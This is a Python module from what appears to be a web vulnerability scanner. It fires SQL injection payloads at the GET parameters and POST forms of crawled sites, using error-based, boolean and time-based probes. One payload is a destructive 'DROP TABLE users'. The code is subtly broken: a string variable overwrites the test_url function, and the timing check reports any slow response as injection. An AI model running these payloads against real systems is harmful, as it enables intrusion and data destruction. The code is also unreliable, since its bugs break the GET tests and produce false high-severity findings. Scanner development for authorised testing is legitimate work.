# modules/sqli.py
# Deep SQL Injection Scanner – Active (error-based + boolean-based + time-based hints)
from config import HEADERS, TIMEOUT
import requests
import time
from bs4 import BeautifulSoup
from urllib.parse import urlparse, parse_qs, urlencode, urljoin

def scan(target_url, pages):
    """
    Deep SQL Injection testing across all crawled pages.
    - Tests GET parameters
    - Tests POST forms
    - Uses error-based, boolean-based, and simple time-based detection
    - Returns findings with severity and PoC
    """
    findings = []
    seen_pocs = set()

    # Strong payload sets for deep scanning
    error_payloads = [
        "'", "\"", "')", "\")", "' OR '1'='1", "1' OR '1'='1", "' OR 1=1--", 
        "1' OR 1=1--", "' UNION SELECT 1,2,3--", "1; DROP TABLE users--"
    ]

    boolean_payloads = ["' AND 1=1--", "' AND 1=2--", "1 AND 1=1", "1 AND 1=2"]

    time_payloads = ["' AND SLEEP(3)--", "1 AND SLEEP(3)--", "'; WAITFOR DELAY '0:0:3'--"]

    def test_url(test_url, original_resp):
        try:
            start_time = time.time()
            r = requests.get(test_url, headers=HEADERS, timeout=TIMEOUT * 2)
            response_time = time.time() - start_time

            text = r.text.lower()

            # 1. Error-based detection
            error_keywords = ["sql syntax", "mysql_fetch", "odbc driver", "postgresql", 
                              "sqlite3", "you have an error in your sql syntax", 
                              "unclosed quotation mark", "ora-01756", "microsoft ole db"]
            if any(kw in text for kw in error_keywords):
                return f"High - SQL Injection (Error-based) | PoC: {test_url}"

            # 2. Boolean-based detection
            if len(original_resp.text) > 100:  # only if we have baseline
                if ("1=1" in test_url or "AND 1=1" in test_url) and len(r.text) > len(original_resp.text) * 0.9:
                    return f"Medium - Possible SQL Injection (Boolean-based true) | PoC: {test_url}"
                if ("1=2" in test_url or "AND 1=2" in test_url) and len(r.text) < len(original_resp.text) * 0.7:
                    return f"Medium - Possible SQL Injection (Boolean-based false) | PoC: {test_url}"

            # 3. Time-based detection (simple)
            if any("sleep" in p.lower() or "waitfor" in p.lower() for p in time_payloads):
                if response_time > 2.5:
                    return f"High - SQL Injection (Time-based blind) | Response delayed {response_time:.1f}s | PoC: {test_url}"

            return None
        except:
            return None

    for page_url, resp in pages:
        original_resp = resp  # baseline

        # === GET parameters testing ===
        parsed = urlparse(page_url)
        if parsed.query:
            params = parse_qs(parsed.query)
            for param_name, values in params.items():
                for payload in error_payloads + boolean_payloads + time_payloads:
                    new_params = params.copy()
                    new_params[param_name] = [payload]
                    test_query = urlencode(new_params, doseq=True)
                    test_url = page_url.split('?')[0] + '?' + test_query

                    result = test_url(test_url, original_resp)
                    if result and test_url not in seen_pocs:
                        seen_pocs.add(test_url)
                        findings.append(result + f" | Location: {page_url} | Parameter: {param_name}")
                        break  # found one → move to next param

        # === POST form testing ===
        soup = BeautifulSoup(resp.text, 'html.parser')
        for form in soup.find_all('form'):
            action = urljoin(page_url, form.get('action', ''))
            method = form.get('method', 'get').lower()

            if method != 'post':
                continue

            form_inputs = [inp.get('name') for inp in form.find_all(['input', 'textarea']) if inp.get('name')]

            for payload in error_payloads + boolean_payloads + time_payloads:
                data = {name: payload for name in form_inputs}
                try:
                    start_time = time.time()
                    r = requests.post(action, data=data, headers=HEADERS, timeout=TIMEOUT * 2)
                    response_time = time.time() - start_time

                    text = r.text.lower()
                    if any(kw in text for kw in ["sql syntax", "mysql_fetch", "you have an error in your sql syntax"]):
                        poc = f"POST {action} with payload in form fields"
                        if poc not in seen_pocs:
                            seen_pocs.add(poc)
                            findings.append(f"High - SQL Injection (POST form, Error-based) | Action: {action} | Location: {page_url}")
                            break
                except:
                    pass

    if not findings:
        findings.append("✅ No SQL Injection vulnerabilities detected with current payloads.")

    return findings
